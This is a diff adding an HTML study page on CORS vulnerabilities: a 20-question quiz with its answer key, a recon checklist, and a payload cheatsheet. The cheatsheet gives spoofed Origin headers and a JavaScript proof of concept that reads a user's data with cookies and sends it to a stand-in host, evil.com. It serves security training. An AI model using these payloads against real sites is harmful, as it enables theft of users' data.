@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CORS Vulnerabilities — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#0d1117; --panel:#161b22; --line:#30363d;
+  --text:#c9d1d9; --dim:#8b949e; --accent:#f0b90b; --bad:#ff4d4d;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#0d1117;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#21262d;}
+.opt.correct{background:#3d2e00;border-color:var(--accent);color:var(--accent);}
+.opt.wrong{background:#2a1212;border-color:var(--bad);color:var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;}
+.btn{background:var(--accent);color:#0d1117;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#0d1117;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#e6edf3;margin:8px 0 4px;}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#0d1117;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // CORS Exploitation Exam</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+// Questions formulated for exam-level difficulty: All options are nearly identical in length to prevent guessing.
+const Q=[
+["What is the primary security purpose of the Same-Origin Policy (SOP)?",["Restricting resource sharing between different web origins securely","Encrypting network traffic between the client and the server","Preventing cross-site scripting attacks via input sanitization","Validating user credentials before granting access to the database"],0,
+"SOP is a critical browser mechanism that prevents a malicious site from reading data from another site."],
+["How does CORS specifically relax the Same-Origin Policy restrictions?",["By using specific HTTP headers to allow cross-origin requests safely","By disabling the firewall rules on the backend server temporarily","By utilizing complex JavaScript obfuscation techniques on frontend","By enforcing strict transport security across all network endpoints"],0,
+"CORS uses HTTP headers like Access-Control-Allow-Origin to explicitly permit cross-origin requests."],
+["Which HTTP response header is essential for a valid CORS configuration?",["Access-Control-Allow-Origin","Content-Security-Policy","X-Frame-Options","Strict-Transport-Security"],0,
+"Access-Control-Allow-Origin specifies which external domains are permitted to read the response."],
+["What defines an 'Origin' in the context of the Same-Origin Policy?",["The combination of protocol, domain, and port number","The absolute path of the requested resource on the server","The IP address and the MAC address of the client machine","The user-agent string and the operating system version"],0,
+"An origin is defined by the scheme (protocol), host (domain), and port. If all three match, it's the same origin."],
+["What is a 'preflight' request in the context of CORS?",["An OPTIONS request checking server permissions before actual request","A GET request used to retrieve security tokens from the endpoint","A POST request containing the payload before authentication","A DELETE request used to clear previous cache on the server"],0,
+"Browsers send an OPTIONS preflight request to check if the actual cross-origin request is safe to send."],
+["Which HTTP header is used by the browser to identify the origin?",["Origin","Referer","Host","X-Forwarded-For"],0,
+"The Origin header tells the server which domain initiated the cross-origin request."],
+["Why is setting `Access-Control-Allow-Origin: *` with credentials unsafe?",["It allows any site to make authenticated requests to the server","It disables TLS encryption for the entire communication channel","It causes the server to crash due to memory exhaustion flaws","It allows attackers to execute arbitrary code on the server"],0,
+"Browsers block `*` with credentials, but if a server poorly reflects the Origin instead, any site can steal user data."],
+["Which HTTP header allows the browser to send cookies in a CORS request?",["Access-Control-Allow-Credentials","Access-Control-Expose-Headers","Access-Control-Max-Age","Access-Control-Allow-Methods"],0,
+"Setting Access-Control-Allow-Credentials: true allows cookies and HTTP auth to be included in cross-origin requests."],
+["What makes an API vulnerable to CORS exploitation?",["Reflecting the Origin header value into ACAO with credentials true","Allowing only GET requests without any authentication headers","Rejecting all requests that do not contain a valid CSRF token","Returning a 404 status code for all preflight OPTIONS requests"],0,
+"If the server blindly reflects the attacker's domain in the ACAO header and allows credentials, it is critically vulnerable."],
+["How can a null origin be dangerous in a CORS configuration?",["Attackers can create sandboxed iframes to generate a null origin","Null origins bypass the Same-Origin Policy without any headers","Null origins are automatically trusted by all proxy servers","Browsers treat null origins as highly secure and privileged"],0,
+"An iframe with the `sandbox` attribute generates a null origin, which can bypass poor whitelist configurations."],
+["What is the danger of using regular expressions for origin validation?",["Subdomain bypasses like evil.com matching target.com regex pattern","Regex validation slows down the server causing denial of service","Regular expressions automatically encode headers causing injection","Browsers cannot read regex patterns in the HTTP response headers"],0,
+"Flawed regex like `.*target.com$` will match `evil-target.com`, allowing the attacker's domain to bypass the check."],
+["Which of the following methods will trigger a preflight CORS request?",["A POST request containing a custom header like X-Api-Key","A GET request with standard browser headers and no payload","A HEAD request used to retrieve metadata from the server","An OPTIONS request sent automatically by the browser"],0,
+"Requests with custom headers, or methods other than GET/HEAD/POST, trigger a preflight OPTIONS request."],
+["How does the browser react if `Access-Control-Allow-Origin` is missing?",["It blocks the response from being read by the cross-origin script","It automatically redirects the user to the target domain safely","It executes the JavaScript payload in the browser silently","It prompts the user to accept the insecure cross-origin request"],0,
+"If the header is missing, SOP remains in effect and the browser prevents the JS from reading the response."],
+["What is the purpose of `Access-Control-Allow-Headers`?",["To specify which request headers are permitted in the actual request","To define the maximum age the preflight request can be cached","To list the allowed HTTP methods for the cross-origin request","To indicate which response headers can be exposed to the client"],0,
+"This header is used in preflight responses to tell the browser which custom headers are allowed in the actual request."],
+["What is an SOP bypass via caching (web cache poisoning)?",["Poisoning the cache with a response generated for a malicious origin","Tricking the browser into caching local storage data permanently","Injecting malicious scripts into the server's main HTML files","Forcing the server to cache invalid user credentials in memory"],0,
+"If a server reflects the Origin without checking it, an attacker can poison the cache with a response accessible to everyone."],
+["If an application trusts `Origin: https://attacker.com`, what is the impact?",["Attacker can steal user data by making authenticated cross-origin requests","Attacker can execute arbitrary system commands on the server directly","Attacker can alter the application's backend database schema remotely","Attacker can permanently disable the target's network infrastructure"],0,
+"The attacker can host a malicious script that fetches sensitive data from the target using the victim's session cookies."],
+["Can a server set `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` simultaneously?",["No, browsers reject this combination for security reasons entirely","Yes, this is the most secure configuration for internal APIs globally","Yes, but only if the request uses HTTPS protocol strictly and safely","No, this configuration causes infinite redirect loops on the server"],0,
+"Browsers explicitly block this combination to prevent any random site from making authenticated requests."],
+["What does `Access-Control-Max-Age` do?",["It specifies how long the preflight request results can be cached","It sets the expiration date for the user's active session cookie","It limits the maximum age of the user's password on the server","It defines the timeout for the backend database connection pool"],0,
+"It tells the browser how long it can cache the preflight response, reducing the number of OPTIONS requests."],
+["How can an attacker exploit a CORS misconfiguration on a file upload?",["By uploading a file from a malicious origin to bypass SOP checks","By deleting the file immediately after the upload is complete","By renaming the file to bypass the server's extension filters","By intercepting the upload and injecting malicious SQL queries"],0,
+"If the upload endpoint reflects the attacker's origin, they can upload malicious files via a cross-origin script."],
+["What is the most secure way to implement CORS for a public API?",["Returning a strict whitelist of allowed origins dynamically checked","Disabling CORS entirely and relying on standard JSON Web Tokens","Using a wildcard asterisk for all origins without credentials enabled","Allowing all subdomains of the target application using regex blindly"],0,
+"A strict whitelist that dynamically checks the incoming Origin against trusted domains is the safest approach."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Origin Reflection Check", items: [
+    "Intercept a cross-origin request and check if <code>Access-Control-Allow-Origin</code> reflects the <code>Origin</code> header.",
+    "Send an arbitrary <code>Origin</code> (e.g., <code>https://evil.com</code>) and observe if it is reflected."
+  ]},
+  { title: "2. Null Origin Bypass", items: [
+    "Send a request with <code>Origin: null</code> to see if the server allows it.",
+    "Test by sandboxing an iframe to generate null origin locally."
+  ]},
+  { title: "3. Regex Bypass (Subdomain Validation)", items: [
+    "If server checks if Origin ends with <code>.target.com</code>, try <code>https://evil.target.com</code>.",
+    "If it checks for <code>target.com</code>, try <code>https://target.com.evil.com</code>."
+  ]},
+  { title: "4. Insecure Wildcard Usage", items: [
+    "Check if <code>Access-Control-Allow-Origin: *</code> is used with <code>Access-Control-Allow-Credentials: true</code>.",
+    "Check if the API relies on cookies/tokens but uses a wildcard for subdomains incorrectly."
+  ]},
+  { title: "5. Method & Header Checks", items: [
+    "Test preflight <code>OPTIONS</code> requests to see allowed methods (<code>PUT</code>, <code>DELETE</code>).",
+    "Test if custom headers (<code>X-Forwarded-For</code>, <code>X-Api-Key</code>) are allowed via <code>Access-Control-Allow-Headers</code>."
+  ]},
+  { title: "6. Exploitation Validation", items: [
+    "Write a PoC JavaScript fetch request from a malicious origin to extract sensitive user data.",
+    "Verify if the response contains sensitive data (PII, tokens) when authenticated via cookies."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Arbitrary Origin Test", code: "Origin: https://evil.com" },
+  { name: "2. Null Origin Test", code: "Origin: null" },
+  { name: "3. Subdomain Regex Bypass", code: "Origin: https://evil.target.com\nOrigin: https://target.com.evil.com" },
+  { name: "4. Preflight Request", code: "OPTIONS /api/data HTTP/1.1\nHost: api.target.com\nOrigin: https://evil.com\nAccess-Control-Request-Method: PUT" },
+  { name: "5. Dangerous Server Response", code: "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true" },
+  { name: "6. PoC for Stealing Data (JS)", code: "fetch('https://api.target.com/user', {credentials: 'include'})\n  .then(r => r.json())\n  .then(d => fetch('https://evil.com/log?data=' + btoa(JSON.stringify(d))));" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"Perfect. You actually understand this.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['🎉','✅','🔥','💛'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('cors_checklist_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('cors_checklist_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${item.code}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
